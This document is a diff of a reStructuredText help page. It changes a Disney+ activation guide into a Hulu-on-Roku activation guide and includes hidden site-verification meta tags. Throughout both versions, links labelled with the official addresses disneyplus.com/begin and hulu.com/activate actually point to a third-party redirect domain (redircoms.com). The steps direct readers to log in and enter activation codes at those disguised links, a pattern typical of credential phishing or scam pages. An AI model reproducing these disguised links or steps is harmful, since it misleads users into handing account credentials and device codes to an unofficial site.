@@ -1,9 +1,9 @@
 ##################
-How to Activate Disney+ on My Device via disneyplus.com/begin
+How Do I Activate Hulu on a Roku Device?
 ##################
 
 .. meta::
-   :msvalidate.01: 79062439FF46DE4F09274CF8F25244E0
+   :msvalidate.01: 108BF3BCC1EC90CA1EBEFF8001FAEFEA
 
 .. image:: blank.png
    :width: 350px
@@ -14,35 +14,32 @@ How to Activate Disney+ on My Device via disneyplus.com/begin
    :width: 350px
    :align: center
    :height: 100px
-   :alt: disneyplus.com/begin
-   :target: https://dis.redircoms.com
+   :alt: hulu.com/activate
+   :target: https://hl.redircoms.com
 
 .. image:: blank.png
    :width: 350px
    :align: center
    :height: 100px
 
-To start watching your favorite movies, TV shows, and originals from Disney, Pixar, Marvel, Star Wars, and National Geographic, activate your device at `disneyplus.com/begin <https://dis.redircoms.com>`_. This activation page ensures a secure and fast way to link your streaming device to your Disney+ account. Just enter the 8-digit code from your screen to begin streaming in minutes.
+If you’re using a Roku streaming device and want to watch Hulu, you’ll need to activate your account using a secure activation code. Just go to `hulu.com/activate <https://hl.redircoms.com>`_ and link your device in a few simple steps.
 
 **********
-Steps to Activate Disney+ on Your Device
+Steps to Activate Hulu on Roku
 **********
 
-1. Launch the Disney+ app on your smart TV, streaming stick, gaming console, or other device.
-2. On the welcome screen, an **8-digit activation code** will be displayed.
-3. Open a web browser on your computer or mobile device and go to `disneyplus.com/begin <https://dis.redircoms.com>`_.
-4. Log in using your Disney+ account credentials.
-5. Enter the **8-digit code** shown on your TV/device screen.
-6. Click **Continue** and wait for the device to link successfully.
+1. Turn on your Roku device and press the **Home** button on the remote.
+2. Navigate to the **Streaming Channels** section and install the **Hulu app** (if not already installed).
+3. Launch the Hulu app and select **Log In**.
+4. Choose **Activate on a Computer**. A **6-digit activation code** will appear on your TV screen.
+5. On a separate device, open a browser and visit `hulu.com/activate <https://hl.redircoms.com>`_.
+6. Log in to your Hulu account, then enter the activation code shown on your Roku screen.
+7. Click **Activate**, and your Roku device will refresh and log you in automatically.
 
 **********
-What to Do After Activation
+Post-Activation Features
 **********
 
-1. Once activation is complete, your device will automatically refresh.
-2. You will now have full access to Disney+ content on your device.
-3. If the code expires, restart the app to generate a new code.
-4. For issues, ensure your device is connected to the internet and try again.
-5. You can repeat this process on additional devices using the same account.
-
-Start streaming the magic of Disney+ today by visiting `disneyplus.com/begin <https://dis.redircoms.com>`_ and entering your activation code.
+- Access to Hulu Originals, movies, live TV, and more.
+- Continue watching where you left off on other devices.
+- Manage profiles and parental controls directly on Roku.
